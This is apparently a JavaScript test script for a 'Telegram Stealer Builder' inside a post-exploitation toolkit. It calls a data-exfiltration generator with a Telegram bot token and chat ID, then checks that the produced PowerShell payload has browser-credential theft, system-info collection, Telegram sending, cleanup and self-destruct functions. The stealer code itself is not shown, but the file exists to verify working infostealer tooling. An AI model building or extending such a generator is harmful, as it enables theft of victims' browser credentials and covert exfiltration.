// Test to verify Telegram builder uses full template

import postExploitationService from './backend/services/postExploitationService.js';

async function testTelegramBuilder() {
  console.log('🧪 Testing Telegram Stealer Builder\n');
  
  try {
    const result = await postExploitationService.dataExfiltration('telegram', {
      botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz123456789',
      chatId: '987654321'
    });
    
    console.log('✅ Generation successful!');
    console.log('Method:', result.method);
    console.log('Name:', result.name);
    console.log('Format:', result.format);
    console.log('Description:', result.description.substring(0, 80) + '...');
    console.log('\n📊 Script Statistics:');
    console.log('Total lines:', result.script.split('\n').length);
    console.log('Total characters:', result.script.length);
    
    // Verify it's using the full template
    const hasWin32API = result.script.includes('Add-Type -TypeDefinition');
    const hasBrowserSteal = result.script.includes('Invoke-BrowserSteal');
    const hasSystemInfo = result.script.includes('Invoke-SystemInfo');
    const hasSendTelegram = result.script.includes('function Send-Telegram');
    const hasCleanup = result.script.includes('Invoke-Cleanup');
    const hasSelfDestruct = result.script.includes('Invoke-SelfDestruct');
    
    console.log('\n✅ Full Template Features Detected:');
    console.log('  - Win32 API Integration:', hasWin32API ? '✓' : '✗');
    console.log('  - Browser Stealer:', hasBrowserSteal ? '✓' : '✗');
    console.log('  - System Info Collector:', hasSystemInfo ? '✓' : '✗');
    console.log('  - Telegram Send Function:', hasSendTelegram ? '✓' : '✗');
    console.log('  - Cleanup Function:', hasCleanup ? '✓' : '✗');
    console.log('  - Self-Destruct:', hasSelfDestruct ? '✓' : '✗');
    
    // Verify user values were replaced
    const hasUserToken = result.script.includes('1234567890:ABCdefGHIjklMNOpqrsTUVwxyz123456789');
    const hasUserChatId = result.script.includes('987654321');
    
    console.log('\n✅ User Configuration:');
    console.log('  - Bot Token Replaced:', hasUserToken ? '✓' : '✗');
    console.log('  - Chat ID Replaced:', hasUserChatId ? '✓' : '✗');
    
    // Check first and last 5 lines
    const lines = result.script.split('\n');
    console.log('\n📄 First 5 lines:');
    lines.slice(0, 5).forEach((line, i) => console.log(`  ${i+1}. ${line.substring(0, 80)}`));
    
    console.log('\n📄 Last 5 lines:');
    const lastLines = lines.slice(-5);
    lastLines.forEach((line, i) => console.log(`  ${lines.length - 5 + i + 1}. ${line}`));
    
    if(lines.length > 3000) {
      console.log('\n✅✅✅ CONFIRMED: Using FULL 3,895-line template!');
    } else {
      console.log('\n⚠️ WARNING: Script seems shorter than expected');
    }
    
  } catch (error) {
    console.error('❌ Test failed:', error.message);
    console.error(error.stack);
  }
}

testTelegramBuilder();
